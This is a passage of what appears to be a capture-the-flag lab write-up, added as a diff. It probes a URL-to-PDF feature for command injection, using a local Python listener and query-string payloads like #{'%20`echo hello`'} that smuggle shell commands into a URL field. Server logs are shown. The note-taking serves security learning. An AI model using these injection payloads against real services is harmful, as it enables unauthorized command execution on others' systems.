@@ -59,3 +59,59 @@ Upgrade-Insecure-Requests: 1
 
 url=
 ```
+
+So, we supply a url and it will print a pdf with its contents
+- This seems like an injection type of vuln
+- I could have it, for instance, print the contents of my current directory
+    - All i'd need to do is set up a network listener
+
+So let's prop up a python web server: `python3 -m http.server 80`
+```
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Then we inject our IP address into the text field
+```
+http://10.10.14.37
+```
+
+We get a PDF in a new tab with the contents of our directory!
+- So, we can connect to our url, and add a `name` query string 
+    - We can delimit a user input `fragment` with `#`
+    - We can encapsulate a user input `fragment` with `{<user_input>}`
+    - We surround our 'payload' string with `''`'s, and the command itself with tick-marks 
+    - Full info on query string syntax is documented in [RFC3986](https://www.rfc-editor.org/rfc/rfc3986)
+
+### Demonstration:
+
+When we try 'http://10.10.14.37/?name=#{`echo hello`}', we get the following:
+```
+Directory listing for /?name=#{`echo hello`}
+```
+
+This is not the output we were hoping for, let's wrap it in single quotes
+
+When we try '`echo hello`', we get a URL-encoded string:
+```
+10.10.11.189 - - [17/Dec/2022 11:57:35] "GET /?name=%23%7B'%60echo%20hello%60'%7D HTTP/1.1" 200 -
+```
+And
+```
+Directory listing for /?name=#{'`echo hello`'}
+```
+
+Also not what we were looking for!
+- If we purposely inject a url-encoded character (like a space - `%20`)
+    - Will that trick the parser into running the input?
+
+Running "http://10.10.14.37/?name=#{'%20`echo hello`'}", we get:
+```
+10.10.11.189 - - [17/Dec/2022 12:29:01] "GET /?name= HTTP/1.1" 200 -
+```
+And
+```
+Directory listing for /?name=
+```
+
+So the instruction looks as though it were processed, but we don't know for sure
